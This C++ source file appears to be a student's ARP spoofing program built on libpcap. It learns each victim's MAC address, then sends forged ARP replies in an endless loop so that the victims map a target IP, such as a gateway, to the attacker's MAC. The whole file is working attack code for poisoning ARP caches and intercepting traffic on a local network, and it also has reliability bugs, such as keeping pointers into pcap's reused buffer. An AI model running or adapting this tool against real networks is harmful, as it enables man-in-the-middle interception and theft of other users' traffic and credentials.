#include <cstdio>
#include <pcap.h>
#include <string>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>



#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender-ip> <target-ip>\n");
	printf("sample: send-arp-test wlan0 192.168.0.31 192.168.0.1\n");
}

void getMacAddress(const char* ifaceName, char* macAddressStr) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("Error opening socket");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);
    

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("Error getting MAC address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    close(sockfd);

    unsigned char* macAddress = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(macAddressStr, "%02X:%02X:%02X:%02X:%02X:%02X",
             macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);
     
    
}


void getIPAddress(const char* ifaceName, char* ipAddressStr) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("Error opening socket");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("Error getting IP address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    close(sockfd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    const char* ipAddress = inet_ntop(AF_INET, &ipaddr->sin_addr, ipAddressStr, INET_ADDRSTRLEN);
    if (ipAddress == NULL) {
        perror("Error converting IP address");
        exit(EXIT_FAILURE);
    }
    
    //printf("%s\n", ipAddress);
    strcpy(ipAddressStr, ipAddress);
    
}


int main(int argc, char* argv[]) {
	//printf("start main");
	if (argc < 3) {
		usage();
		return 1;
	}

	char* dev = argv[1];
	// printf("%s\n", dev);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	const char* ifname = dev;
	
	char my_mac_addr[18];
	char my_ip_addr[20];
	
	getMacAddress(ifname, my_mac_addr);
	
	getIPAddress(ifname, my_ip_addr);
	
	printf("%s\n", my_mac_addr);
	printf("%s\n", my_ip_addr);

	EthArpPacket reqpacket;

	struct pcap_pkthdr* header;
	const u_char* packet;

	int sender_num = ((argc - 2) / 2);
	EthArpPacket** respacket = new EthArpPacket*[sender_num];

	// send and receive arp request to sender
	for (int i = 2, j = 0; i < argc; i += 2, j++) {

		// send arp request to sender
		
		// ethernet frame
		// dst mac: broadcast
		reqpacket.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");

		// src mac: my mac
		reqpacket.eth_.smac_ = Mac(my_mac_addr);

		// type: arp
		reqpacket.eth_.type_ = htons(EthHdr::Arp);

		// arp datagram
		reqpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
		reqpacket.arp_.pro_ = htons(EthHdr::Ip4);
		reqpacket.arp_.hln_ = Mac::SIZE;
		reqpacket.arp_.pln_ = Ip::SIZE;
		reqpacket.arp_.op_ = htons(ArpHdr::Request);
		reqpacket.arp_.smac_ = Mac(my_mac_addr); // source mac (self)
		reqpacket.arp_.sip_ = htonl(Ip(my_ip_addr)); // source ip (self)
		reqpacket.arp_.tmac_ = Mac("00:00:00:00:00:00"); // target mac (00:)
		reqpacket.arp_.tip_ = htonl(Ip(argv[i])); // victim ip

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reqpacket), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		// receive ARP response from sender
		
		int timeout_ms = 1000; // 타임아웃 1000ms
		int ret = pcap_next_ex(handle, &header, &packet);
		printf("%d\n", ret);
		if (ret == 1) { // 패킷 정상 수신
			respacket[j] = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
		}
		else { // 타임아웃이 발생한 경우
			puts("Timeout occurred.");
		}

	}
	

	EthArpPacket atkpacket;

	// arp spoof sender
	while(1) {

		for (int i = 2, j = 0; i < argc; i += 2, j++) {
			// dst mac: sender mac
			atkpacket.eth_.dmac_ = respacket[j]->eth_.smac_;
			// src mac: my mac
			atkpacket.eth_.smac_ = Mac(my_mac_addr);
			atkpacket.eth_.type_ = htons(EthHdr::Arp);

			atkpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
			atkpacket.arp_.pro_ = htons(EthHdr::Ip4);
			atkpacket.arp_.hln_ = Mac::SIZE;
			atkpacket.arp_.pln_ = Ip::SIZE;
			atkpacket.arp_.op_ = htons(ArpHdr::Reply);
			// src mac: my mac
			atkpacket.arp_.smac_ = Mac(my_mac_addr);
			// src ip: target ip
			atkpacket.arp_.sip_ = htonl(Ip(argv[i + 1]));
			// target mac: sender mac
			atkpacket.arp_.tmac_ = respacket[j]->eth_.smac_;
			// target ip: sender ip
			atkpacket.arp_.tip_ = htonl(Ip(argv[i]));

			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atkpacket), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
		}
	}
	
	delete[] respacket;
	pcap_close(handle);
}


